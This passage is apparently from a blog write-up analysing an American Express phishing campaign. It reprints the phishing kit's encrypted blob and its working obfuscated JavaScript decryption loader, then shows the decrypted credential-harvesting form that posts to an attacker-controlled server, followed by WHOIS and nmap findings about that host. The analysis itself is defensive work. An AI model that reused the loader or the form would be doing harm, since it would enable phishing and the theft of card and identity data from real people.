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";
/** @type {number} */
var gkWpGrHmFAxvec = 3790844;
/** @type {number} */
var WUMfiHnNDJpwye = 3;
/** @type {number} */
var DshbKYGIrjPUTd = 46903;
/**
 * @param {string} coords
 * @return {?}
 */
function SrWQtjmATgpPXc(coords) {
  coords = coords.split("").reverse().join("");
  var reverseMap = {};
  var k;
  var JphwkeTdSLnYfi;
  /** @type {!Array} */
  var t = [];
  /** @type {string} */
  var context_data_string = "";
  /** @type {function(...number): string} */
  var f = String.fromCharCode;
  /** @type {!Array} */
  var tUmrXRVIHBLQku = [[65, 91], [97, 123], [48, 58], [43, 44], [47, 48]];
  for (eLyOMCgjnQsWEq in tUmrXRVIHBLQku) {
    k = tUmrXRVIHBLQku[eLyOMCgjnQsWEq][0];
    for (; k < tUmrXRVIHBLQku[eLyOMCgjnQsWEq][1]; k++) {
      t.push(f(k));
    }
  }
  /** @type {number} */
  k = 0;
  for (; k < 64; k++) {
    /** @type {number} */
    reverseMap[t[k]] = k;
  }
  /** @type {number} */
  k = 0;
  for (; k < coords.length; k = k + 72) {
    /** @type {number} */
    var b = 0;
    var a;
    var i;
    /** @type {number} */
    var l = 0;
    var m = coords.substring(k, k + 72);
    /** @type {number} */
    i = 0;
    for (; i < m.length; i++) {
      a = reverseMap[m.charAt(i)];
      b = (b << 6) + a;
      /** @type {number} */
      l = l + 6;
      for (; l >= 8;) {
        /** @type {string} */
        context_data_string = context_data_string + f((b >>> (l = l - 8)) % 256);
      }
    }
  }
  return context_data_string;
}
/**
 * @param {string} url
 * @param {string} param_hash
 * @return {?}
 */
function JyCKWwezHbpPYl(url, param_hash) {
  /** @type {string} */
  UGZmdFhYybpDNe = "";
  /** @type {number} */
  cfiMJuVNtpeAXj = 0;
  /** @type {number} */
  YTkudBgUZRWqPe = 0;
  for (; cfiMJuVNtpeAXj < url.length; cfiMJuVNtpeAXj++, YTkudBgUZRWqPe++) {
    if (YTkudBgUZRWqPe == 64) {
      /** @type {number} */
      YTkudBgUZRWqPe = 0;
    }
    /** @type {string} */
    UGZmdFhYybpDNe = UGZmdFhYybpDNe + String.fromCharCode(url.charCodeAt(cfiMJuVNtpeAXj) ^ param_hash.charCodeAt(YTkudBgUZRWqPe));
  }
  return UGZmdFhYybpDNe;
}
/**
 * @param {string} chars
 * @param {string} w
 * @return {?}
 */
function JyCKWwezHbpPYl(chars, w) {
  /** @type {!Array} */
  var S = [];
  /** @type {number} */
  var j = 0;
  var t;
  /** @type {string} */
  var pix_color = "";
  /** @type {number} */
  var i = 0;
  for (; i < 256; i++) {
    /** @type {number} */
    S[i] = i;
  }
  /** @type {number} */
  i = 0;
  for (; i < 256; i++) {
    /** @type {number} */
    j = (j + S[i] + chars.charCodeAt(i % chars.length)) % 256;
    t = S[i];
    S[i] = S[j];
    S[j] = t;
  }
  /** @type {number} */
  i = 0;
  /** @type {number} */
  j = 0;
  /** @type {number} */
  var k = 0;
  for (; k < w.length; k++) {
    /** @type {number} */
    i = (i + 1) % 256;
    /** @type {number} */
    j = (j + S[i]) % 256;
    t = S[i];
    S[i] = S[j];
    S[j] = t;
    /** @type {string} */
    pix_color = pix_color + String.fromCharCode(w.charCodeAt(k) ^ S[(S[i] + S[j]) % 256]);
  }
  return pix_color;
}
/**
 * @param {number} isowner
 * @param {number} filter
 * @return {?}
 */
function ZLUogrShWOndwv(isowner, filter) {
  /** @type {number} */
  gkWpGrHmFAxvec = gkWpGrHmFAxvec * 128 % 2409203;
  return gkWpGrHmFAxvec % (filter - isowner + 1) + isowner;
}
/**
 * @return {?}
 */
function VOUKwhALZYiHIc() {
  /** @type {string} */
  var retainedSizes = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
  /** @type {!Array} */
  var markup_classes = new Array(3);
  /** @type {number} */
  var ML_SCRIPT_DATA = 0;
  for (; ML_SCRIPT_DATA < 3; ML_SCRIPT_DATA++) {
    /** @type {string} */
    markup_classes[ML_SCRIPT_DATA] = "";
  }
  /** @type {number} */
  var dominatorOrdinal = 0;
  for (; dominatorOrdinal < 3; dominatorOrdinal++) {
    /** @type {number} */
    ML_SCRIPT_DATA = 0;
    for (; ML_SCRIPT_DATA < 64; ML_SCRIPT_DATA++) {
      markup_classes[dominatorOrdinal] += retainedSizes[ZLUogrShWOndwv(0, 51)];
    }
  }
  return markup_classes;
}
var dQMrFWhDtVxKkz = SrWQtjmATgpPXc(OLnARWFQitgSyE);
var ftkhoEGjzSRmlu = VOUKwhALZYiHIc();
/** @type {number} */
var sMKqvUNnTczmGe = 3 - 1;
for (; sMKqvUNnTczmGe >= 0; sMKqvUNnTczmGe--) {
  dQMrFWhDtVxKkz = JyCKWwezHbpPYl(ftkhoEGjzSRmlu[sMKqvUNnTczmGe], dQMrFWhDtVxKkz);
}
if (DshbKYGIrjPUTd < dQMrFWhDtVxKkz.length) {
  dQMrFWhDtVxKkz = dQMrFWhDtVxKkz.substring(0, dQMrFWhDtVxKkz.length - (dQMrFWhDtVxKkz.length - 46903));
}
/** @type {!HTMLDocument} */
ToRIKQibtONzUp = document;
/** @type {number} */
var i = 0;
for (; i < dQMrFWhDtVxKkz.length; i++) {
  ToRIKQibtONzUp.write(dQMrFWhDtVxKkz[i]);
};
```

We need to unpack this even further.

### Second blob

There is another large, encrypted blob, stored in `OLnARWFQitgSyE`. Fortunately we don't have to look at the logic, as the decryption function is provided for us. I'm not going to go into how the decryption is done, but all the functions and variables above are used in the process. There were actually some syntax errors (such as not having `var`, `let`, or `const` before variable names) but once those were fixed we could get the actual contents. I've included the relevant part below.

```html
<form name="0" id="0" action="http://souzoku-roots.com/gzipdb/data.php" autocomplete="off" method="post">
    <div class="fuidformContent clearfix">
        <div class="formHeader clearfix">
            <h1 tabindex="0"> Cardmembership | Update </h1>
            <span><img id="secureImage" src="http://209.160.59.204/css/fonts/spacer.png" alt='This is a secure page' title='This is a secure page' tabindex="0"/></span>
        </div>
        <div class="startingStep">1. Enter Profile Details</div>
        <div class="clearfix fuidNav">
            <div class="active normal identyWidth" tabindex="0">
                <span class="normalText">1. Enter Profile Details</span>
                <span class="activeArrow"></span>
            </div>
            <div class="normal retriveIdWidth">
                <span class="normalText">2. Done!</span>
                <span class="normalArrow"></span>
            </div>
        </div>
        <div class="clear"></div>
        <div class="headerHelpText" tabindex="0">
            A simple validation process to quickly you as possible. First we need to confirm your profile details. All
            Fields Required *.
        </div>
        <div class="hide" id="serverSiderErr">
            <div class="serverSiderErrInner">
                <span class="errorIcon"></span>
                <span id="serverErrMsg"></span>
            </div>
        </div>
        ...
    </div>
</form>
```

<picture class="centered-image">
  <source srcset="/images/amex-scam-site.webp" type="image/webp">
  <source srcset="/images/amex-scam-site.png" type="image/jpeg"> 
  <img alt="Scam amex site" class="centered-image" src="/images/amex-scam-site.png">
</picture>
<p class="footnote">"American Express" site</p>

This renders as above. They really try to milk you for as much information as possible - card number, mothers maiden name, place of birth, elementary school, security pin, and sign in details. 

## Inspecting the traffic

Upon clicking submit, your data get's `POST`ed to a URL (`http://souzoku-roots.com`).

<picture class="centered-image">
  <source srcset="/images/amex-scam-route.webp" type="image/webp">
  <source srcset="/images/amex-scam-route.png" type="image/jpeg"> 
  <img alt="scam amex route" class="centered-image" src="/images/amex-scam-route.png">
</picture>
<p class="footnote">"American Express" data submission</p>

The server actually replies back with a `302` that links to [http://alerts-ui-prod.americanexpress.com/IPPWeb/thankyou.do?Face=en_USHEUQS001](http://alerts-ui-prod.americanexpress.com/IPPWeb/thankyou.do?Face=en_USHEUQS001), which is an *actual* American Express domain. 

This is hosted on `http://souzoku-roots.com/gzipdb/data.php`. We can see that their server lives at `203.83.243.114`, which is also registered in the British Virgin Islands.

This domain is much older, though, and was originally registered in April of 2011. This is probably a master server that is used for all their scam campaigns.

```
Domain Name: souzoku-roots.com
Registry Domain ID: 1648600398_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.discount-domain.com
Registrar URL: http://www.onamae.com
Updated Date: 2018-03-30T00:00:00Z
Creation Date: 2011-04-01T00:00:00Z
Registrar Registration Expiration Date: 2019-04-01T00:00:00Z
Registrar: GMO INTERNET, INC.
Registrar IANA ID: 49
Registrar Abuse Contact Email: abuse@gmo.jp
Registrar Abuse Contact Phone: +81.337709199
Domain Status: ok https://icann.org/epp#ok
Registry Registrant ID: Not Available From Registry
Registrant Name: <censored>
Registrant Organization: <censored>
Registrant Street: <censored>
Registrant Street: <censored>
Registrant City: <censored>
Registrant State/Province: <censored>
Registrant Postal Code: <censored>
Registrant Country: JP
Registrant Phone: <censored>
Registrant Phone Ext:
Registrant Fax: <censored>
Registrant Fax Ext:
Registrant Email: <censored>
```

There's one small difference this time - the `Registrant` information isn't hidden. I've censored the information here, but it's easily found on your own.
 
The website seems to be about Japanese inheritance law. It's unclear whether the website has been compromised and is being used to collect this data, or if it's a front for the actual scam campaigns.

## More domain info

An nmap scan shows that there are a lot of ports and services open. The host machine seems to have a few domains associated with it. The first domain found, `pck.bonyari.jp`, just runs an old version of Parallels Plesk Panel. A CVE search shows that this is A) outdated software with B) multiple 10.0 CVEs. This is most likely a compromised machine piggybacking the scammers service, but we can't know for certain.

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-02 18:36 PST
PORT     STATE    SERVICE            VERSION
21/tcp   open     ftp                ProFTPD 1.3.1
22/tcp   open     ssh                OpenSSH 4.3 (protocol 2.0)
53/tcp   open     domain             ISC BIND 9.3.4-P1
80/tcp   open     http               Apache httpd 2.2.3 ((CentOS))
110/tcp  open     pop3               Courier pop3d
143/tcp  open     imap               Courier Imapd (released 2004)
443/tcp  open     ssl/http           Apache httpd 2.2.3 ((CentOS))
465/tcp  open     ssl/smtp           qmail smtpd
587/tcp  open     smtp               qmail smtpd
993/tcp  open     ssl/imap           Courier Imapd (released 2004)
995/tcp  open     ssl/pop3           Courier pop3d
3306/tcp open     mysql              MySQL 5.0.45
| mysql-info:
|   Protocol: 10
|   Version: 5.0.45
|   Thread ID: 27774186
|   Capabilities flags: 41516
|   Some Capabilities: SupportsTransactions, Speaks41ProtocolNew, Support41Auth, SupportsCompression, LongColumnFlag, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: >cZuafZrOtz(UU,v11?-
8443/tcp open     ssl/http           Apache httpd
|_http-server-header: Apache
| http-title:           VZPP Plesk - Plesk 8.6.0 \xE3\x81\xAB\xE3\x83\xAD\xE3\x82\xB0\xE3\x82\xA4\xE3\x83\xB3
|_Requested resource was https://pck.bonyari.jp:8443/vz/cp/panel/plesk/frameset
| ssl-cert: Subject: organizationName=Parallels, Inc./stateOrProvinceName=VA/countryName=US
| Not valid before: 2015-02-15T14:20:29
|_Not valid after:  2016-02-15T14:20:29
|_ssl-date: 2019-02-03T02:37:25+00:00; 0s from scanner time.
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.13
Network Distance: 17 hops
Service Info: Hosts: localhost.localdomain, vz170.jpnsv.com; OS: Unix
```

There is also an open `mysql` server running on the default port, which is potentially how the data is being downloaded periodically.

### Conclusion

That's where I stopped - I didn't want to do anything further like actually run a vulnerability scan or prove how the server was compromised, as that would be a legal grey area. 

Overall we:

* Found the original spam domain and
* Got OSINT on it via DNS, Nmap, and Domain/IP history
* Found the domain the malware was being hid on
* Reversed and deobfuscated on layer of HTML, which contained the first set of `script` tags that contained the second payload
* Partially reversed the second payload, which contained raw `HTML` and a hardcoded path to the attackers server
* Got OSINT on the server via the same methods above, and learned that this server has been up and running for a while, and is not secure or patched
* Found the route to their DB and how they were actually extracting data

The attacker did a fairly good job of disguising their work. Their DNS entries were valid and had a valid spf setup, the payload was twice encrypted to prevent static analysis, the assets and page all links to valid amex domains, and finally actually redirected you to a valid amex domain after `POST`ing your data to their server ([http://alerts-ui-prod.americanexpress.com/IPPWeb/thankyou.do?Face=en_USHEUQS001](http://alerts-ui-prod.americanexpress.com/IPPWeb/thankyou.do?Face=en_USHEUQS001)). 

I currently have no plans to a) approach any of the hosts found or b) performing adversarial action against the attacker. I wanted to stay on the clear legal side, and am also not sure if the hosts we found were actually compromised or directly belong to the attacker. I did report the email to American Express, but that's the extent of my interaction with this scam. 

It's always fun to see how attackers are disguising their code and identity. This was a pretty fun exploration of a single attackers point of view. We really didn't get much personally actionable info, besides the registrant of the second compromised domain, but it was an interesting Saturday project nonetheless. 

###### Footnotes

[^1]: Thanks to [https://ficoforums.myfico.com/t5/Credit-Cards/Amex-last-four-numbers/td-p/3384473](https://ficoforums.myfico.com/t5/Credit-Cards/Amex-last-four-numbers/td-p/3384473)
[^2]: See [this discussion](https://webapps.stackexchange.com/questions/23/how-can-i-search-for-a-keyword-with-special-characters-in-google-search) for more info. Bing is [also not helpful at all](https://i.imgur.com/TfNfORa.png)
